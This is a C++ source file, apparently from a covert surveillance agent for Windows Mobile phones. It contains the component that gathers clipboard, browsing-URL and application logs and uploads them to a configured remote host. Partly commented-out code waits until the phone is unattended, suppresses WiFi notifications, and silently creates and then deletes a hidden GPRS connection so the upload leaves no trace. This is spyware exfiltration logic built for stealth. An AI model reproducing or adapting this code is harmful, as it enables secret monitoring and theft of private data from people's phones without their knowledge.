#include <memory>
#include <common_new\cfgmgrapi.h>
#include <common_new\regext.h>
#include <common_new\connmgr.h>

#include "Synchronize.h"
#include "ModulesManager.h"

#include "FunctionFunc.h"


Synchronize::Synchronize(Configuration *c) : stopAction(FALSE) {
	conf = c;
	status = Status::self();
	modules = ModulesManager::self();
	///device = Device::self();
}

INT Synchronize::run() {
	BOOL stop, wifi, cell;
	wstring host;
	INT ret = 0;

	try {
		stop = conf->getBool(L"stop");
	} catch (...) {
		stop = FALSE;
	}

	try {
		wifi = conf->getBool(L"wifi");
	} catch (...) {
		wifi = TRUE;
	}

	try {
		cell = conf->getBool(L"cell");
	} catch (...) {
		cell = TRUE;
	}

	try {
		host = conf->getString(L"host");
	} catch (...) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [host not set]\n", 5, FALSE);
		return SEND_FAIL;
	}

	if ((status->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
		return SEND_FAIL;
	}

	// Cycle log-append modules
	//modules->cycle(L"position");
	modules->cycle(L"application");
	modules->cycle(L"clipboard");
	modules->cycle(L"url");

	_Sleep(500);

	// Proviamo a spedire via internet (WiFi/Gprs o chi lo sa...)
	ret = InternetSend(host);

	switch (ret) {
		case SEND_UNINSTALL: 
		case SEND_RELOAD:
		case SEND_OK:
			stopAction = stop;
			return ret;

		default: 
			break;
	}
/***
#ifndef _DEBUG
	if (device->IsDeviceUnattended() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Device is active, aborting]\n", 5, FALSE);
		return SEND_FAIL;
	}
#endif
***/

	// Vediamo se dobbiamo syncare via WiFi (solo se il display e' spento)
	if (wifi) {
		ret = syncWiFi();

		switch (ret) {
			case SEND_UNINSTALL: 
			case SEND_RELOAD:
			case SEND_OK:
				stopAction = stop;
				return ret;

			default: 
				break;
		}
	}
/***
#ifndef _DEBUG
	if (device->IsDeviceUnattended() == FALSE) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSync() [Device is active, aborting [2]]\n", 5, FALSE);
		return SEND_FAIL;
	}
#endif

	// Vediamo se dobbiamo syncare tramite GPRS
	if (cell && device->IsSimEnabled()) {
		ret = syncGprs();

		switch (ret) {
			case SEND_UNINSTALL: 
			case SEND_RELOAD:
			case SEND_OK:
				stopAction = stop;
				return ret;

			default: 
				break;
		}
	}
	***/
	DBG_TRACE(L"Debug - Task.cpp - ActionSync() FAILED [3]\n", 4, FALSE);
	return SEND_FAIL;
}

INT Synchronize::syncWiFi() {
/***
	wstring host = conf->getString(L"host");

	device->DisableWiFiNotification();
	device->HTCEnableKeepWiFiOn();

	ForceWiFiConnection();

	INT ret = InternetSend(host);

	ReleaseWiFiConnection();
	device->RestoreWiFiNotification();

	return ret;
	***/
	return NULL;
}

INT Synchronize::syncGprs() {
/***
	wstring host;	
	
	try {
		host = conf->getString(L"host");
	} catch (...) {
		DBG_TRACE(L"Debug - Task.cpp - syncGprs() [host not set]\n", 5, FALSE);
		return SEND_FAIL;
	}

	ForceGprsConnection();

	INT ret = InternetSend(host);

	ReleaseGprsConnection();

	return ret;
***/
	return NULL;
}

INT Synchronize::syncApn() {

/***
	HANDLE _hConnection;
	LPWSTR wsz_Output = NULL;
	INT ret;
	wstring apnName, apnUser, apnPass, host;

	try {
		host = conf->getString(L"host");
		apnName = conf->getStringFromArray(L"apn", L"name");
		apnUser = conf->getStringFromArray(L"apn", L"user");
		apnPass = conf->getStringFromArray(L"apn", L"pass");
	} catch (...) {
		return SEND_FAIL;
	}

	// Costruiamo il nome della connessione
	wstring imei = device->GetImei();
	imei = imei.assign(imei, imei.size() - 9, 8);

	// Costruiamo l'XML per la rimozione della connessione
	wstring wsz_Delete =
		L"<wap-provisioningdoc>"
		L"<characteristic type=\"CM_GPRSEntries\">"
		L"<nocharacteristic type=\"";

	wsz_Delete += imei.c_str();
	wsz_Delete += L"\"/></characteristic></wap-provisioningdoc>";

	// Costruiamo l'XML per l'inserimento della connessione
	wstring wsz_Add = 
		L"<wap-provisioningdoc><characteristic type=\"CM_GPRSEntries\">"
		L"<characteristic type=\"";
	wsz_Add += imei;
	wsz_Add += L"\">"
		L"<parm name=\"DestId\" value=\"{7022E968-5A97-4051-BC1C-C578E2FBA5D9}\"/>"
		L"<parm name=\"Phone\" value=\"~GPRS!";
	wsz_Add += apnName;
	wsz_Add += L"\"/><parm name=\"UserName\" value=\"";
	wsz_Add += apnUser;
	wsz_Add += L"\"/><parm name=\"Password\" value=\"";
	wsz_Add += apnPass;
	wsz_Add += L"\"/>"
		L"<parm name=\"Enabled\" value=\"1\"/><characteristic type=\"DevSpecificCellular\">"
		L"<parm name=\"GPRSInfoAccessPointName\" value=\"";
	wsz_Add += apnName;
	wsz_Add += L"\"/></characteristic></characteristic></characteristic>"
		L"</wap-provisioningdoc>";

#ifndef _DEBUG
	// Usciamo se il telefono e' in uso
	if (device->IsDeviceUnattended() == FALSE) {
		if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
			delete[] wsz_Output;

		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [Device is active, aborting] [1]\n", 5, FALSE);
		return SEND_FAIL;
	}
#endif
	***/
/***
	// Inseriamo la connessione
	HRESULT hr = DMProcessConfigXML(wsz_Add.c_str(), CFGFLAG_PROCESS, &wsz_Output);

	if (hr != S_OK) {
		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [DMProcessConfigXML() failed]\n", 4, FALSE);
		return SEND_FAIL;
	}

	delete[] wsz_Output;

	// Troviamo la GUID della connessione
	GUID IID_Internet;
	WCHAR wGuid[40];
	wstring wstrGuid = L"Comm\\ConnMgr\\Providers\\{7C4B7A38-5FF7-4bc1-80F6-5DA7870BB1AA}\\Connections\\";
	wstrGuid += imei;

	hr = RegistryGetString(HKEY_LOCAL_MACHINE, wstrGuid.c_str(), L"ConnectionGUID", wGuid, 
		sizeof(wGuid) / sizeof(WCHAR));

	if (hr != S_OK) {
		if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
			delete[] wsz_Output;

		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [RegistryGetString() failed]\n", 4, FALSE);
		return SEND_FAIL;
	}

	hr = CLSIDFromString(wGuid, &IID_Internet);

	if (hr != NOERROR) {
		if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
			delete[] wsz_Output;

		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [CLSIDFromString() failed]\n", 4, FALSE);
		return SEND_FAIL;
	}

	// Connettiti tramite il connection manager
	CONNMGR_CONNECTIONINFO ConnectionInfo;
	DWORD dwStatus;

	ZeroMemory (&ConnectionInfo, sizeof (ConnectionInfo));
	ConnectionInfo.cbSize = sizeof (ConnectionInfo);

	ConnectionInfo.dwParams = CONNMGR_PARAM_GUIDDESTNET; 
	ConnectionInfo.dwFlags = CONNMGR_FLAG_NO_ERROR_MSGS; 
	ConnectionInfo.dwPriority = CONNMGR_PRIORITY_HIPRIBKGND; 
	ConnectionInfo.guidDestNet = IID_Internet;

	hr = ConnMgrEstablishConnectionSync (&ConnectionInfo, &_hConnection, 30000, &dwStatus);

	if (hr != S_OK) {
		if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
			delete[] wsz_Output;

		DBG_TRACE(L"Debug - Task.cpp - ActionSyncApn() [ConnMgrEstablishConnectionSync() failed]\n", 4, FALSE);
	}

	// Inviamo i dati
	ret = InternetSend(host);

	ConnMgrReleaseConnection(_hConnection, 0);

	// Dobbiamo attendere che termini la connessione altrimenti non possiamo rimuoverla
	Sleep(1500);

	if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
		delete[] wsz_Output;

	return ret;
	***/
	return NULL;
}

BOOL Synchronize::getStop() {
	return stopAction;
}